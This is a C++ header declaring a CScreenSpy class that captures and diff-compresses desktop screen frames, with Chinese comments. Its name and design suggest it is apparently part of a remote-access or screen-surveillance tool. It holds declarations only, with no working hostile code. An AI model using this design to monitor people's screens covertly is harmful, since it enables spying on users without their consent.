// ScreenSpy.h: interface for the ScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENSPY_H__11D14B8B_ABF2_4628_B267_8C9E64418D67__INCLUDED_)
#define AFX_SCREENSPY_H__11D14B8B_ABF2_4628_B267_8C9E64418D67__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#include "Common.h"
#endif // _MSC_VER > 1000

#define ALGORITHM_DIFF	1	// 速度很慢，也占CPU，但是数据量都是最小的
class CScreenSpy  
{
public:
	CScreenSpy(int biBitCount= 8, bool bIsGray= false, UINT nMaxFrameRate = 100);
	virtual ~CScreenSpy();
	bool CScreenSpy::SelectInputWinStation();
	LPVOID CScreenSpy::getFirstScreen();
	UINT CScreenSpy::getBISize();
	LPBITMAPINFO CScreenSpy::getBI();
	UINT CScreenSpy::getFirstImageSize();
	LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes);
	LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight);
	void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight);
	int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize );
	void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount);


private:
	int	 m_biBitCount;       //每个像素所需要的位数
	HWND m_hDeskTopWnd;      //Explorer.exe 的主窗口句柄
	HDC  m_hFullDC;          //Explorer.exe 的窗口设备DC
	HDC  m_hFullMemDC;       //主屏幕的内存DC
	int  m_nFullWidth, m_nFullHeight;               //屏幕的分辨率
	LPBITMAPINFO  m_lpbmi_full;                     //主屏幕BitMapInfor

	BYTE m_bAlgorithm;
	UINT m_nMaxFrameRate;
	bool m_bIsGray;
	DWORD m_dwBitBltRop;
	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
	LPBYTE m_rectBuffer;
	UINT m_rectBufferOffset;
	BYTE m_nIncSize;
	int  m_nStartLine;
	RECT m_changeRect;
	HDC  m_hLineMemDC, m_hRectMemDC;
	HBITMAP m_hLineBitmap, m_hFullBitmap;
	LPVOID m_lpvLineBits, m_lpvFullBits;
	LPBITMAPINFO m_lpbmi_line,m_lpbmi_rect;
	int	m_nDataSizePerLine;
	CCursorInfo	m_CursorInfo;
	LPVOID m_lpvDiffBits;                         // 差异比较的下一张
	HDC	m_hDiffDC, m_hDiffMemDC;
	HBITMAP	m_hDiffBitmap;


};

#endif // !defined(AFX_SCREENSPY_H__11D14B8B_ABF2_4628_B267_8C9E64418D67__INCLUDED_)
